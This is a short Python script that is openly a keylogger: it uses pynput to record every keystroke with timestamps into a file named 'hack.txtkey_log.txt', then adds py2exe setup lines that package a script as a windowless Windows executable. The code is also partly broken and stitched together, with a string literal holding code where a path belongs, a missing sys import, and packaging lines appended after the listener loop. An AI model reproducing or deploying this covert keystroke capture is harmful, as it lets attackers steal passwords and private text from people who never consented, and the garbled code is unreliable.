from pynput.keyboard import Key, Listener
import logging
import os

log_dir = "os.chdir(os.path.dirname(sys.argv[0]))"

#logging.basicConfig(filename=(log_dir + "hack.txtkey_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
logging.basicConfig(filename=("hack.txtkey_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()

print ("hy")
from distutils.core import setup
import py2exe
setup(windows=['codeautodir.py'])